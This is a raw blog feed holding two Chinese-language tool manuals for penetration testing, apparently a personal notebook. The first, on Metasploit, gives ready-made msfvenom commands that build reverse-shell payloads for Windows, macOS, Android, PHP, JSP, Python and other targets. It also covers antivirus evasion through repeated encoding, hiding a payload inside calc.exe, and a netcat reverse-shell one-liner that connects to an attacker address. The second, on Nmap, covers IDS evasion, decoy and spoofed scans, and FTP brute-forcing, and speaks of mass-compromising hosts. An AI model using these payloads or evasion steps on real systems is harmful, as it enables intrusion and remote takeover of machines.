class="line">3. Base库是在针对Core库进行进一步人性化的拓展的库，算作一个中间层，为开发者提供API以轻松调用MSF的功能，我们使用的各种插件，我们上期提到的console接口，还有收费版的UI界面，以及自己开发的插件，都是在base库的基础上进一步拓展的。</span><br><span class="line">4. Plugin插件，这里提到的插件与我刚刚讲到的有略微差异，他这里提到的插件指的是成熟的工具&#x2F;软件，如各种成熟的扫描器，老牌扫描厂商的存在，已经不需要MSF再去开发新的插件啦，直接调用就好啦。</span><br><span class="line"></span><br><span class="line">### Exp和Poc</span><br><span class="line"></span><br><span class="line">- 通常 Exp 和 PoC 都是可执行的漏洞利用脚本&#x2F;程序 ，</span><br><span class="line">- 区别主要在于是否恶意，</span><br><span class="line"></span><br><span class="line">1. PoC 是 Proof of Concept (概念验证) 通常是内含无害的漏洞代码，比如弹出一个计算器什么的</span><br><span class="line">2. Exp  是 Exploit (漏洞利用) 通常是内含恶意的漏洞代码</span><br><span class="line"></span><br><span class="line">- 我们现在着重看一下exploits和payloads的内容，当然啦，这里的exploits正是我们刚刚提到的exp</span><br><span class="line">- exp在msf中来讲，其实本身并没有恶意行为，只是它会调用恶意payloads来进行测试，</span><br><span class="line"></span><br><span class="line">### 模块(modules)</span><br><span class="line"></span><br><span class="line">1. msf有六大模块</span><br></pre></td></tr></table></figure> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">1.</span><br></pre></td></tr></table></figure> ls /opt/metasploit/modules auxiliary  evasion   nops      post encoders   exploits  payloads <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">- 预辅助模块（auxiliary)：执行信息收集，枚举，指纹探测，扫描等功能的辅助模块(没有payload的exploit模块)</span><br><span class="line">- 渗透模块(exploits)：利用系统漏洞进行攻击动作，此模块对应每一个具体漏洞的攻击方法（主动，被动）</span><br><span class="line">- 攻击荷载(payloads)：成功exploit之后，真正在目标系统中执行的代码或者命令</span><br><span class="line">- 后渗透模块(posts)：</span><br><span class="line">- 空字段模块(nops)：提高payload稳定性及维持大小</span><br><span class="line">- 编码模块(Encoders)：对payload进行加密，躲过av检查的模块</span><br><span class="line"></span><br><span class="line">1. exploits分类</span><br></pre></td></tr></table></figure> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>ls /opt/metasploit/modules/exploitsaix        bsdi        freebsd  mainframe  qnxandroid    dialup      hpux     multi      solarisapple_ios  example.rb  irix     netware    unixbsd        firefox     linux    osx        windows<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">payloads分类</span><br></pre></td></tr></table></figure></code></pre></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">1.</span><br></pre></td></tr></table></figure><p>   ls /opt/metasploit/modules/payloads<br>   singles  stagers  stages<br>   <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">- Single有点类似我们常说的大马，它不依赖任何环境或组件，只要它成功上传，它就可以实现它所有的功能。</span><br><span class="line">- stager有点类似我们常说的一句话，它只是用于建立连接。</span><br><span class="line">- stages完全是为了搭配前者使用，这时候出于黑客逻辑肯定会问，为什么不接着上传第一步的single，答：stages-payload的功能更倾向于底层，执行系统命令</span><br><span class="line"></span><br><span class="line">### 常用exp</span><br><span class="line"></span><br><span class="line">#### 扫描</span><br><span class="line"></span><br><span class="line">1. snmp枚举模块</span><br></pre></td></tr></table></figure></p>   <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>12  auxiliary/scanner/snmp/snmp_enum                                      normal     Yes    SNMP Enumeration Module</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">tcp扫描</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">1.</span><br></pre></td></tr></table></figure><p>   0  auxiliary/scanner/portscan/tcp                   normal  Yes    TCP Port Scanner<br>   <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">#### 爆破</span><br><span class="line"></span><br><span class="line">1. ssh爆破</span><br></pre></td></tr></table></figure></p>   <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">1.</span><br></pre></td></tr></table></figure><p>   17  auxiliary/scanner/ssh/ssh_login                                              normal     Yes    SSH Login Check Scanner<br>   <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">## 后门生成</span><br><span class="line"></span><br><span class="line">### msfvenom常用选项</span><br><span class="line"></span><br><span class="line">- -p, –payload           指定需要使用的payload(攻击荷载)。如果需要使用自定义的payload，请使用&#39;-&#39;或者stdin指定</span><br><span class="line">- -l, –list       [module_type]   列出指定模块的所有可用资源. 模块类型包括: payloads, encoders, nops, all</span><br><span class="line">- -n, –nopsled            为payload预先指定一个NOP滑动长度</span><br><span class="line">- -f, –format             指定输出格式 (使用 –help-formats 来获取msf支持的输出格式列表)</span><br><span class="line">- -e, –encoder    [encoder]       指定需要使用的encoder（编码器）</span><br><span class="line">- -a, –arch         指定payload的目标架构</span><br><span class="line">- –platform         指定payload的目标平台</span><br><span class="line">- -s, –space              设定有效攻击荷载的最大长度</span><br><span class="line">- -b, –bad-chars            设定规避字符集，比如: &#39;\x00\xff&#39;</span><br><span class="line">- -i, –iterations          指定payload的编码次数</span><br><span class="line">- -c, –add-code             指定一个附加的win32 shellcode文件</span><br><span class="line">- -x, –template             指定一个自定义的可执行文件作为模板</span><br><span class="line">- -k, –keep                       保护模板程序的动作，注入的payload作为一个新的进程运行</span><br><span class="line">- –payload-options            列举payload的标准选项</span><br><span class="line">- -o, –out                  保存payload</span><br><span class="line">- -v, –var-name             指定一个自定义的变量，以确定输出格式</span><br><span class="line">- –shellest                   最小化生成payload</span><br><span class="line">- -h, –help                       查看帮助选项</span><br><span class="line">- –help-formats               查看msf支持的输出格式列表</span><br><span class="line"></span><br><span class="line">### 生成payload</span><br><span class="line"></span><br><span class="line">- 生成payload，有有两个必须的选项：-p -f </span><br><span class="line"></span><br><span class="line">- 使用-p 来指定要使用的payload。</span><br><span class="line"></span><br><span class="line">- 可以使用下面的命令来查看所有msf可用的payload列表</span><br></pre></td></tr></table></figure></p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>./msfvenom -l payloads</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">-p选项也支持使用使用自定义的payload，需要使用 “-“，比如:</span><br></pre></td></tr></table></figure><p>cat payload_file.bin | ./msfvenom -p - -a x86 –platform win -e x86/shikata_ga_nai -f raw</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">使用-f 来指定payload的输出格式</span><br><span class="line"></span><br><span class="line">举例：</span><br></pre></td></tr></table></figure><p>./msfvenom -p windows/meterpreter/bind_tcp -f exe</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">使用下面的命令，可以产看msf支持的输出格式</span><br></pre></td></tr></table></figure><p>./msfvenom –help-formats</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">一个典型的msfvenom使用举例如下：</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">-</span><br></pre></td></tr></table></figure><p>  $ ./msfvenom -p windows/meterpreter/reverse_tcp lhost=[Attacker&#039;s IP] lport=4444 -f exe -o /tmp/my_payload.exe<br>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">### 对payload进行编码</span><br><span class="line"></span><br><span class="line">- 如果你使用了-b选项（设定了规避字符集），会自动调用编码器。</span><br><span class="line"></span><br><span class="line">- 其他情况下，你需要使用-e选项来使用编码模块，例如：</span><br></pre></td></tr></table></figure></p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>./msfvenom -p windows/meterpreter/bind_tcp -e x86/shikata_ga_nai -f raw</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">可以使用下面的命令，来查看可用的编码器</span><br></pre></td></tr></table></figure><p>./msfvenom -l encoders</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">你也可以使用-i选项进行多次编码。某些情况下，迭代编码可以起到规避杀毒软件的作用，但你需要知道，编码并没有使用一个真正意义上的AV规避方案。</span><br><span class="line"></span><br><span class="line">可以使用下面的命令来进行迭代编码：</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">-</span><br></pre></td></tr></table></figure><p>  ./msfvenom -p windows/meterpreter/bind_tcp -e x86/shikata_ga_nai -i 3<br>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">### 规避字符</span><br><span class="line"></span><br><span class="line">- 使用-b选项意味着在生成payload的时候对某些字符进行规避。当你使用这个选项的时候，msfvenom会自动的使用合适的编码器对payload进行编码，比如：</span><br></pre></td></tr></table></figure></p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">-</span><br></pre></td></tr></table></figure><p>  ./msfvenom -p windows/meterpreter/bind_tcp -b &#039;\x00&#039; -f raw<br>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">### 使用自定义可执行文件模板</span><br><span class="line"></span><br><span class="line">- 默认的，msfvenom使用的模板文件保存在msf&#x2F;data&#x2F;templates目录中，如果你想使用你自己的模板文件，你可以使用-x选项来指定，比如：</span><br></pre></td></tr></table></figure></p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">-</span><br></pre></td></tr></table></figure><p>  ./msfvenom -p windows/meterpreter/bind_tcp -x calc.exe -f exe &gt; new.exe<br>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">- 这个命令将使用windows下计算器程序（calc.exe）作为可执行文件的模板生成payload。</span><br><span class="line"></span><br><span class="line">- 注意：如果你想要创建一个windows的x64的可执行文件模板来生成一个x64的payload，你只能使用exe格式的模板。</span><br><span class="line"></span><br><span class="line">- 使用-x选项经常和-k选项配合使用，-k选项会将你的payload作为一个新的进程运行。但目前这个选项只支持老版本的windows系统比如windows xp</span><br><span class="line"></span><br><span class="line">### 常用示例</span><br><span class="line"></span><br><span class="line">- 在攻击机的msf中启动监听模块，use exploit&#x2F;multi&#x2F;handler，并设置相应的payload，payload的选择取决于生成被控端文件用了什么模块，名字都是一样的。接着options设置好相应的参数。</span><br><span class="line"></span><br><span class="line">1. windows msf shell反弹</span><br></pre></td></tr></table></figure></p>   <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>msfvenom -a x86 –platform Windows -p windows/meterpreter/reverse_tcp LHOST=攻击机IP LPORT=攻击机端口 -e x86/shikata_ga_nai -b ‘\x00\x0a\xff’ -i 3 -f exe -o payload.exe</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">mac msf shell反弹</span><br></pre></td></tr></table></figure><p>msfvenom -a x86 –platform osx -p osx/x86/shell_reverse_tcp LHOST=攻击机IP LPORT=攻击机端口 -f macho -o payload.macho</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">android msf shell反弹 &#x2F;&#x2F;需要签名</span><br></pre></td></tr></table></figure><p>msfvenom -a x86 –platform Android -p android/meterpreter/reverse_tcp LHOST=攻击机IP LPORT=攻击机端口 -f apk -o payload.apk</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">powershell msf shell反弹</span><br></pre></td></tr></table></figure><p>msfvenom -a x86 –platform Windows -p windows/powershell_reverse_tcp LHOST=攻击机IP LPORT=攻击机端口 -e cmd/powershell_base64 -i 3 -f raw -o payload.ps1</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">linux msf shell反弹</span><br></pre></td></tr></table></figure><p>msfvenom -a x86 –platform Linux -p linux/x86/meterpreter/reverse_tcp LHOST=攻击机IP LPORT=攻击机端口 -f elf -o payload.elf</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">php msf shell反弹</span><br></pre></td></tr></table></figure><p>msfvenom -p php/meterpreter_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw &gt; shell.php cat shell.php | pbcopy &amp;&amp; echo ‘&lt;?php ‘ | tr -d ‘\n’ &gt; shell.php &amp;&amp; pbpaste &gt;&gt; shell.php</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">aspx msf shell反弹</span><br></pre></td></tr></table></figure><p>msfvenom -a x86 –platform windows -p windows/meterpreter/reverse_tcp LHOST=攻击机IP LPORT=攻击机端口 -f aspx -o payload.aspx</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">jsp msf shell反弹</span><br></pre></td></tr></table></figure><p>msfvenom –platform java -p java/jsp_shell_reverse_tcp LHOST=攻击机IP LPORT=攻击机端口 -f raw -o payload.jsp</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">war msf shell反弹</span><br></pre></td></tr></table></figure><p>msfvenom -p java/jsp_shell_reverse_tcp LHOST=攻击机IP LPORT=攻击机端口 -f raw -o payload.war</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">js msf shell反弹</span><br></pre></td></tr></table></figure><p>msfvenom -p nodejs/shell_reverse_tcp LHOST=攻击机IP LPORT=攻击机端口 -f raw -o payload.js</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">python msf shell反弹</span><br></pre></td></tr></table></figure><p>msfvenom -p python/meterpreter/reverse_tcp LHOST=攻击机IP LPORT=攻击机端口 -f raw -o payload.py</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">perl msf shell反弹</span><br></pre></td></tr></table></figure><p>msfvenom -p cmd/unix/reverse_perl LHOST=攻击机IP LPORT=攻击机端口 -f raw -o payload.pl</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">ruby msf shell反弹</span><br></pre></td></tr></table></figure><p>msfvenom -p ruby/shell_reverse_tcp LHOST=攻击机IP LPORT=攻击机端口 -f raw -o payload.rb</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">lua msf shell反弹</span><br></pre></td></tr></table></figure><p>msfvenom -p cmd/unix/reverse_lua LHOST=攻击机IP LPORT=攻击机端口 -f raw -o<br>payload.lua</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">windows shellcode:</span><br></pre></td></tr></table></figure><p>msfvenom -a x86 –platform Windows -p windows/meterpreter/reverse_tcp LHOST=攻击机IP LPORT=攻击机端口 -f c</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">linux shellcode</span><br></pre></td></tr></table></figure><p>msfvenom -a x86 –platform Linux -p linux/x86/meterpreter/reverse_tcp LHOST=攻击机IP LPORT=攻击机端口 -f c</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">mac shellcode</span><br></pre></td></tr></table></figure><p>msfvenom -a x86 –platform osx -p osx/x86/shell_reverse_tcp LHOST=攻击机IP<br>LPORT=攻击机端口 -f c</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">生成nc反弹一句话</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">1.</span><br></pre></td></tr></table></figure><p>   msfvenom -p cmd/unix/reverse_netcat lhost=192.168.1.102 lport=8888 R</p><p>   mkfifo /tmp/lerttd; nc 192.168.1.102 8888 0&lt;/tmp/lerttd | /bin/sh &gt;/tmp/lerttd 2&gt;&1; rm /tmp/lerttd</p><p>   ```</p><p>​                      </p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;msf基本命令&quot;&gt;&lt;a href=&quot;#msf基本命令&quot; class=&quot;headerlink&quot; title=&quot;msf基本命令&quot;&gt;&lt;/a&gt;msf基本命令&lt;/h2&gt;&lt;h3 id=&quot;所有命令&quot;&gt;&lt;a href=&quot;#所有命令&quot; class=&quot;headerlink&quot; titl
      
    
    </summary>
    
    
      <category term="工具手册" scheme="http://yoursite.com/categories/%E5%B7%A5%E5%85%B7%E6%89%8B%E5%86%8C/"/>
    
    
      <category term="后渗透工具" scheme="http://yoursite.com/tags/%E5%90%8E%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7/"/>
    
  </entry>
  
  <entry>
    <title>Nmap手册</title>
    <link href="http://yoursite.com/2020/01/25/nmap%E6%89%8B%E5%86%8C/"/>
    <id>http://yoursite.com/2020/01/25/nmap%E6%89%8B%E5%86%8C/</id>
    <published>2020-01-25T15:24:29.000Z</published>
    <updated>2020-02-25T15:01:18.830Z</updated>
    
    <content type="html"><![CDATA[<p>Nmap受到攻击者和管理员的欢迎，因为它非常有效且可靠。它是网络诊断和网络系统评估的重要组成部分。除此之外，漏洞扫描程序 Nessus还使用它来检测开放端口。</p><h3 id="参数"><a href="#参数" class="headerlink" title="参数"></a>参数</h3><h4 id="目标选取"><a href="#目标选取" class="headerlink" title="目标选取"></a>目标选取</h4><p>-iL filename 从文件中读取待检测的目标,文件中的表示方法支持机名,ip,网段<br>-iR hostnum 随机选取,进行扫描.如果-iR指定为0,则是无休止的扫描<br>–exclude host1[, host2] 从扫描任务中需要排除的主机<br>–exculdefile exclude_file 排除文件中的IP,格式和-iL指定扫描文件的格式相同</p><h4 id="主机发现"><a href="#主机发现" class="headerlink" title="主机发现"></a>主机发现</h4><p>-sL 仅仅是显示,扫描的IP数目,不会进行任何扫描<br>-sn ping扫描,即主机发现<br>-Pn 不检测主机存活<br>-PS/PA/PU/PY[portlist] TCP SYN Ping/TCP ACK Ping/UDP Ping发现<br>-PE/PP/PM 使用ICMP echo, timestamp and netmask 请求包发现主机<br>-PO[prococol list] 使用IP协议包探测对方主机是否开启<br>-n/-R 不对IP进行域名反向解析/为所有的IP都进行域名的反响解析<br>–dns-servers 制定dns服务器地址<br>–system-dns 使用系统DNS<br>–traceroute: 跟踪每个主机的路径</p><h4 id="扫描技巧"><a href="#扫描技巧" class="headerlink" title="扫描技巧"></a>扫描技巧</h4><p>-sS/sT/sA/sW/sM TCP SYN/TCP connect()/ACK/TCP窗口扫描/TCP Maimon扫描<br>-sU UDP扫描<br>-sN/sF/sX TCP Null，FIN，and Xmas扫描<br>–scanflags 自定义TCP包中的flags<br>-sI zombie host[:probeport] Idlescan<br>-sY/sZ SCTP INIT/COOKIE-ECHO 扫描<br>-sO 使用IP protocol 扫描确定目标机支持的协议类型<br>-b “FTP relay host” 使用FTP bounce scan</p><h4 id="指定端口和扫描顺序"><a href="#指定端口和扫描顺序" class="headerlink" title="指定端口和扫描顺序"></a>指定端口和扫描顺序</h4><p>-p 特定的端口 -p80,443 或者 -p1-65535<br>-p U:PORT 扫描udp的某个端口, -p U:53<br>-F 快速扫描模式,比默认的扫描端口还少<br>-r 不随机扫描端口,默认是随机扫描的<br>–top-ports “number” 扫描开放概率最高的number个端口,出现的概率需要参考nmap-services文件,ubuntu中该文件位于/usr/share/nmap.nmap默认扫前1000个<br>–port-ratio “ratio” 扫描指定频率以上的端口</p><h4 id="服务版本识别"><a href="#服务版本识别" class="headerlink" title="服务版本识别"></a>服务版本识别</h4><p>-sV 开放版本探测,可以直接使用-A同时打开操作系统探测和版本探测<br>–version-intensity “level” 设置版本扫描强度,强度水平说明了应该使用哪些探测报文。数值越高，服务越有可能被正确识别。默认是7<br>–version-light 打开轻量级模式,为–version-intensity 2的别名<br>–version-all 尝试所有探测,为–version-intensity 9的别名<br>–version-trace 显示出详细的版本侦测过程信息</p><h4 id="脚本扫描"><a href="#脚本扫描" class="headerlink" title="脚本扫描"></a>脚本扫描</h4><p>-sC　　根据端口识别的服务,调用默认脚本<br>–script=”Lua scripts”　　调用的脚本名<br>–script-args=n1=v1,[n2=v2]　　调用的脚本传递的参数<br>–script-args-file=filename　　使用文本传递参数<br>–script-trace　　显示所有发送和接收到的数据<br>–script-updatedb　　更新脚本的数据库<br>–script-help=”Lua script”　　显示指定脚本的帮助</p><h4 id="OS识别"><a href="#OS识别" class="headerlink" title="OS识别"></a>OS识别</h4><p>-O 启用操作系统检测,-A来同时启用操作系统检测和版本检测<br>–osscan-limit 　　 针对指定的目标进行操作系统检测(至少需确知该主机分别有一个open和closed的端口)<br>–osscan-guess 　　推测操作系统检测结果,当Nmap无法确定所检测的操作系统时，会尽可能地提供最相近的匹配，Nmap默认进行这种匹配</p><h4 id="防火墙-IDS躲避和哄骗"><a href="#防火墙-IDS躲避和哄骗" class="headerlink" title="防火墙/IDS躲避和哄骗"></a>防火墙/IDS躲避和哄骗</h4><p>-f; –mtu value 指定使用分片、指定数据包的MTU.<br>-D decoy1,decoy2,ME 使用诱饵隐蔽扫描<br>-S IP-ADDRESS 源地址欺骗<br>-e interface 使用指定的接口<br>-g/ –source-port PROTNUM 使用指定源端口<br>–proxies url1,[url2],… 使用HTTP或者SOCKS4的代理<br>–date 设置包内发送的数据、<br>–date-string 设置发送的字符串<br>–data-length NUM 填充随机数据让数据包长度达到NUM<br>–ip-options OPTIONS 使用指定的IP选项来发送数据包<br>–ttl VALUE 设置IP time-to-live域<br>–spoof-mac ADDR/PREFIX/VEBDOR MAC地址伪装<br>–badsum 使用错误的checksum来发送数据包</p><h4 id="Nmap-输出"><a href="#Nmap-输出" class="headerlink" title="Nmap 输出"></a>Nmap 输出</h4><p>-oN 将标准输出直接写入指定的文件<br>-oX 输出xml文件<br>-oS 将所有的输出都改为大写<br>-oG 输出便于通过bash或者perl处理的格式,非xml<br>-oA BASENAME 可将扫描结果以标准格式、XML格式和Grep格式一次性输出<br>-v 提高输出信息的详细度<br>-d level 设置debug级别,最高是9<br>–reason 显示端口处于带确认状态的原因<br>–open 只输出端口状态为open的端口<br>–packet-trace 显示所有发送或者接收到的数据包<br>–iflist 显示路由信息和接口,便于调试<br>–log-errors 把日志等级为errors/warings的日志输出<br>–append-output 追加到指定的文件<br>–resume FILENAME 恢复已停止的扫描<br>–stylesheet PATH/URL 设置XSL样式表，转换XML输出<br>–webxml 从namp.org得到XML的样式<br>–no-sytlesheet 忽略XML声明的XSL样式表</p><h4 id="时间性能优化"><a href="#时间性能优化" class="headerlink" title="时间性能优化"></a>时间性能优化</h4><p>-T 　　时间优化(0-5)(paranoid|sneaky|polite|normal|aggressive|insane)<br>-F　　快速扫描。<br>–max-retries　　调整重传次数。<br>–min-hostgroup/–max-hostgroup size 　　设置组的大小<br>–min-parallelism/–max-parellelism time　　指定时间内的探针数<br>–min-rtt-timrout/–max-rtt-timrout/initial-rtt-timrouttime 　　指定探针超时<br>–scan-delay/-max-scan-delay time 　　指定探针之间的时延<br>–max-retries tries　　指定探针重传转发数<br>–host-timeout time　　设置扫描主机的最大时间<br>–defeat-rst-ratelimit　　设置rst的限制</p><h4 id="其他Nmap选项"><a href="#其他Nmap选项" class="headerlink" title="其他Nmap选项"></a>其他Nmap选项</h4><p>-6 开启IPv6<br>-A OS识别,版本探测,脚本扫描和traceroute<br>–datedir DIRNAME 说明用户Nmap数据文件位置<br>–send-eth / –send-ip 使用原以太网帧发送/在原IP层发送<br>–privileged 假定用户具有全部权限<br>–unprovoleged 假定用户不具有全部权限,创建原始套接字需要root权限<br>-V 打印版本信息<br>-h 输出帮助</p><h3 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h3><h4 id="和ftp相关的漏洞检测脚本21"><a href="#和ftp相关的漏洞检测脚本21" class="headerlink" title="和ftp相关的漏洞检测脚本21"></a>和ftp相关的漏洞检测脚本21</h4><p>ftp-anon.nse    检查目标ftp是否允许匿名登录,光能登陆还不够,它还会自动检测目录是否可读写,如,批量ftp抓鸡</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"># nmap -p 21 --script ftp-anon.nse -v 192.168.3.23</span><br></pre></td></tr></table></figure><p>ftp-brute.nse    ftp爆破脚本 [只会尝试一些比较简单的弱口令,时间可能要稍微长一些(挂vpn以后这个爆破速度可能会更慢),毕竟,是直接在公网爆破]</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td 